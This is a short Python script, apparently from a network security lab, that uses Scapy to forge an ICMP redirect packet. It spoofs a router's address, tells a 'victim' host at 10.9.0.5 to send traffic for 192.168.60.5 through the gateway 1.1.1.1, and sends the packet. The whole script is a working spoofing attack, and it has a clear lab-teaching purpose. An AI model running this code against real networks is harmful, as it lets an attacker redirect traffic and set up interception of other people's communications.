#!/usr/bin/python3
from scapy.all import *

ip  = IP(src="10.9.0.11", dst="10.9.0.5") # router :src, victim: dst 

icmp = ICMP(type=5, code=1)
icmp.gw = "1.1.1.1"
ip2 = IP(src="10.9.0.5", dst="192.168.60.5")

send(ip/icmp/ip2/ICMP());

